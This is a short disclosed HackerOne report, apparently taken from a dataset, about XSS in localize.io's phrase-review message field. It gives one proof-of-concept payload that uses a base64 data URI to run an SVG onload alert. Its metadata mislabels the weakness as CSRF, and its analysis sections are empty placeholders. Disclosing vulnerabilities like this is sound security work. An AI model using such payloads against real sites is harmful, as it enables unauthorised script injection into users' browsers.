---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '7876'
original_report_id: '7876'
title: XSS & HTML injection
weakness: Cross-Site Request Forgery (CSRF)
team_handle: localize
created_at: '2014-04-17T18:33:50.709Z'
disclosed_at: '2014-04-18T01:05:23.432Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 7
tags:
- hackerone
- cross-site-request-forgery-csrf
---

# XSS & HTML injection

## Metadata

- HackerOne Report ID: 7876
- Weakness: Cross-Site Request Forgery (CSRF)
- Program: localize
- Disclosed At: 2014-04-18T01:05:23.432Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

Link:
http://www.localize.io/review/3C/languages/3

while approving and reviewing a phrase, you are able to send/set a message. You can XSS that by entering an  XSS string

String used:
<object data=data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoNCk+></object>?

Screenshot:
http://prntscr.com/3awo2p

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
